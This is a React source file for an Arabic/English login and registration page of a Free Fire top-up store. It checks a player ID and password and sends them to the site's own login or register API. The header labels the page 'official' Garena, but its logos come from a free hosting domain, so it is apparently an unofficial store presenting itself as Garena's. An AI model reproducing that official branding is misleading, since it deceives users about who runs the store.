import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import axios from 'axios';
import { motion, AnimatePresence } from 'motion/react';
import { Globe, ChevronDown, Check, Eye, EyeOff } from 'lucide-react';
import LoaderButton from '../components/LoaderButton';
import Modal from '../components/Modal';
import { useLanguage } from '../context/LanguageContext';

export default function LoginRegister() {
  const { t, language, setLanguage } = useLanguage();
  const [isLangOpen, setIsLangOpen] = useState(false);
  const [isLogin, setIsLogin] = useState(true);
  const [accountId, setAccountId] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [banInfo, setBanInfo] = useState<{isOpen: boolean, msg: string}>({isOpen: false, msg: ''});
  
  const navigate = useNavigate();

  useEffect(() => {
    const token = localStorage.getItem('ff_token');
    if (token) {
      navigate('/charge');
    }
  }, [navigate]);

  const handleAuth = async () => {
    if (!accountId || !password) {
      setError(t('fill_required_data') || 'يرجى ملأ جميع الحقول');
      return;
    }
    
    if (!/^\d{9,}$/.test(accountId)) {
      setError(language === 'ar' ? 'معرّف اللاعب يجب أن يكون 9 أرقام على الأقل' : 'Player ID must be at least 9 digits');
      return;
    }

    if (password.length < 8) {
      setError(language === 'ar' ? 'كلمة المرور يجب أن لا تقل عن 8 حروف' : 'Password must be at least 8 characters');
      return;
    }
    if (!/(?=.*[a-zA-Z])/.test(password)) {
      setError(language === 'ar' ? 'كلمة المرور يجب أن تحتوي على الأقل حرف أجنبي (a-z)' : 'Password must contain at least one English letter');
      return;
    }
    if (!/(?=.*\d)/.test(password)) {
      setError(language === 'ar' ? 'كلمة المرور يجب أن تحتوي على أرقام' : 'Password must contain numbers');
      return;
    }
    if (/\s/.test(password)) {
      setError(language === 'ar' ? 'يمنع استخدام المسافات في كلمة المرور' : 'Spaces are not allowed in the password');
      return;
    }
    if (!/^[a-zA-Z0-9@_.\-!#$%^&*()]+$/.test(password)) {
      setError(language === 'ar' ? 'يمنع استخدام الرموز التي تحدث مشاكل أو الحروف غير الإنجليزية' : 'Problematic symbols or non-English characters are not allowed');
      return;
    }

    setLoading(true);
    setError('');
    
    try {
      const endpoint = isLogin ? '/api/login' : '/api/register';
      const res = await axios.post(endpoint, { account_id: accountId, password });
      
      localStorage.setItem('ff_token', res.data.token);
      localStorage.setItem('ff_user', JSON.stringify(res.data.user));

      navigate('/charge');
    } catch (err: any) {
      if (err.response?.status === 403 && err.response?.data?.status === 'banned') {
        setBanInfo({ isOpen: true, msg: err.response.data.message });
      } else {
        setError(err.response?.data?.message || 'فشل في عملية الاتصال');
      }
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#F8F9FA] pb-20 font-sans" dir={language === 'ar' ? 'rtl' : 'ltr'}>
      {/* Header */}
      <header className="sticky top-0 z-40 bg-white shadow-sm">
        <div className="mx-auto flex h-16 max-w-4xl items-center justify-between px-4">
          <div className="flex items-center gap-3">
            <div className="mx-auto flex h-10 w-10 items-center justify-center overflow-hidden rounded-md border border-gray-100 bg-white shadow-sm">
              <img
                src="https://storingo.lovestoblog.com/garena.png"
                alt="Garena"
                className="h-full w-full object-contain p-1"
                onError={(e) => {
                  e.currentTarget.style.display = "none";
                }}
              />
            </div>
            <div className="leading-tight">
              <div className="text-sm font-bold text-gray-800">{t('garena_center')}</div>
              <div className="text-xs font-semibold text-gray-500">{t('official')}</div>
            </div>
          </div>
          <div className="flex items-center gap-2 relative">
            <button 
              onClick={() => setIsLangOpen(!isLangOpen)}
              className="flex items-center gap-1 rounded-full border border-gray-200 bg-gray-50 px-3 py-1.5 text-xs font-bold text-gray-700 hover:bg-gray-100 transition-colors"
            >
              <Globe className="h-4 w-4" />
              <span>{language === 'ar' ? t('dz_ar') : t('dz_en')}</span>
              <ChevronDown className={`h-4 w-4 transition-transform ${isLangOpen ? 'rotate-180' : ''}`} />
            </button>
            <AnimatePresence>
              {isLangOpen && (
                <motion.div 
                  initial={{ opacity: 0, y: 10, scale: 0.95 }}
                  animate={{ opacity: 1, y: 0, scale: 1 }}
                  exit={{ opacity: 0, y: 10, scale: 0.95 }}
                  transition={{ duration: 0.15 }}
                  className="absolute top-10 left-0 min-w-[160px] rounded-2xl bg-white p-2 shadow-xl border border-gray-100 z-50"
                  dir={language === 'ar' ? 'rtl' : 'ltr'}
                >
                  <button 
                    onClick={() => { setLanguage('ar'); setIsLangOpen(false); }}
                    className={`flex items-center w-full text-right px-3 py-2 rounded-xl text-sm font-bold transition-colors ${language === 'ar' ? 'bg-red-50 text-red-600' : 'text-gray-700 hover:bg-gray-50'}`}
                  >
                    <span className="flex-1">العربية (dz)</span>
                    {language === 'ar' && <Check className="h-4 w-4" />}
                  </button>
                  <button 
                    onClick={() => { setLanguage('en'); setIsLangOpen(false); }}
                    className={`flex items-center w-full text-right px-3 py-2 rounded-xl mt-1 text-sm font-bold transition-colors ${language === 'en' ? 'bg-red-50 text-red-600' : 'text-gray-700 hover:bg-gray-50'}`}
                  >
                    <span className="flex-1">English (dz)</span>
                    {language === 'en' && <Check className="h-4 w-4" />}
                  </button>
                </motion.div>
              )}
            </AnimatePresence>
          </div>
        </div>
      </header>

      <main className="mx-auto max-w-md px-4 pt-10">
        <motion.div 
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="rounded-2xl border border-gray-100 bg-white p-6 shadow-sm"
        >
          <div className="mb-6 text-center">
            <div className="mx-auto mb-4 flex h-20 w-20 items-center justify-center overflow-hidden rounded-2xl border-2 border-red-600 p-0.5 shadow-md bg-white">
              <img
                src="https://storingo.lovestoblog.com/ff.png"
                alt="Free Fire"
                className="h-full w-full rounded-xl object-cover"
                onError={(e) =>
                  (e.currentTarget.src =
                    "https://play-lh.googleusercontent.com/NejsQExEa0ZqV4xOMr0HjWd2mK95P_k1Gq-U2xI2qXYR0z8C6rE8lQ6YIIf4rY1R3W8=w240-h480-rw")
                }
              />
            </div>
            <h1 className="mb-1 text-2xl font-black text-gray-900">متجر فري فاير</h1>
            <p className="text-sm text-gray-500">
              {isLogin ? t('login_to_start') : t('create_to_start')}
            </p>
          </div>

          <div className="space-y-4">
            <div>
              <label className="mb-1.5 block text-sm font-bold text-gray-700">{t('id')}</label>
              <input 
                type="text" 
                value={accountId}
                onChange={(e) => setAccountId(e.target.value)}
                className="w-full rounded-xl border border-gray-300 bg-gray-50 p-4 text-sm font-medium text-gray-900 outline-none transition-all placeholder:text-gray-400 focus:border-red-500 focus:bg-white focus:ring-2 focus:ring-red-100"
                placeholder="يرجى إدخال معرّف اللاعب"
              />
            </div>
            <div>
              <label className="mb-1.5 block text-sm font-bold text-gray-700">{t('password')}</label>
              <div className="relative">
                <input 
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full rounded-xl border border-gray-300 bg-gray-50 p-4 pr-12 text-sm font-medium text-gray-900 outline-none transition-all placeholder:text-gray-400 focus:border-red-500 focus:bg-white focus:ring-2 focus:ring-red-100 rtl:pl-12 rtl:pr-4"
                  placeholder="••••••••"
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className={`absolute top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600 transition-colors ${language === 'ar' ? 'left-4' : 'right-4'}`}
                >
                  {showPassword ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
                </button>
              </div>
            </div>

            {error && <p className="text-center text-sm font-bold text-red-500">{error}</p>}

            <LoaderButton 
              isLoading={loading}
              onClick={handleAuth}
              className="mt-2 w-full rounded-xl bg-red-600 py-4 text-lg font-bold text-white shadow-lg shadow-red-600/20 hover:bg-red-700 active:scale-95 transition-all transition-colors"
            >
              {isLogin ? t('login') : t('register')}
            </LoaderButton>

            <div className="mt-4 text-center text-sm font-semibold text-gray-500">
              {isLogin ? t('no_account') : t('have_account')}
              <button 
                onClick={() => { setIsLogin(!isLogin); setError(''); }}
                className="text-red-600 hover:underline inline-block mx-1"
              >
                {isLogin ? t('register') : t('login')}
              </button>
            </div>
          </div>
        </motion.div>
      </main>

      <Modal 
        isOpen={banInfo.isOpen} 
        onClose={() => setBanInfo({ ...banInfo, isOpen: false })}
        title="الحساب محظور!"
        type="error"
      >
        <div className="text-center">
          <p className="mb-6">{banInfo.msg}</p>
          <button 
            onClick={() => setBanInfo({ ...banInfo, isOpen: false })}
            className="w-full rounded-xl bg-gray-100 text-gray-900 py-3 font-bold hover:bg-gray-200 transition-colors"
          >
            إغلاق
          </button>
        </div>
      </Modal>

    </div>
  );
}
